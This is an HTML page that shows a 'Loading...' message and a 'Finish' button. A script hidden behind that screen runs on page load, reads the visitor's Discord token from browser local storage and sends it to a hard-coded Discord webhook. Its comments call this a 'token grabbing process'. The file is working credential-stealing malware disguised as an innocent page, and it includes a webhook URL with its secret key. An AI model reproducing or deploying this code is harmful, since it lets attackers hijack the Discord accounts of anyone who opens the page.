<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        #loading {
            text-align: center;
        }
        #finishButton {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="loading">
        <p>Loading...</p>
        <button id="finishButton">Finish</button>
    </div>
    <script>
        // Function to get the Discord token from local storage
        function getDiscordToken() {
            return localStorage.getItem('token');
        }

        // Function to send the token to the webhook
        function sendTokenToWebhook(token) {
            const webhookUrl = 'https://discord.com/api/webhooks/1552042396278063311/yxaPrCIPm4TlxGQvY-ApvaEEibgQVB9QNZIIv4txiuyBB9lGPzBo1ZKlJoO0aKAGWt0S';
            const message = {
                content: `Discord token: ${token}`
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(message)
            })
            .then(response => response.json())
            .then(data => {
                console.log('Token sent to webhook:', data);
            })
            .catch((error) => {
                console.error('Error sending token to webhook:', error);
            });
        }

        // Main function to handle the token grabbing process
        function main() {
            const token = getDiscordToken();
            if (token) {
                sendTokenToWebhook(token);
            } else {
                console.log('No Discord token found.');
            }
        }

        // Run the main function when the page loads
        window.onload = main;

        // Hide the loading message and button after token is sent
        document.getElementById('finishButton').addEventListener('click', () => {
            document.getElementById('loading').style.display = 'none';
        });
    </script>
</body>
</html>
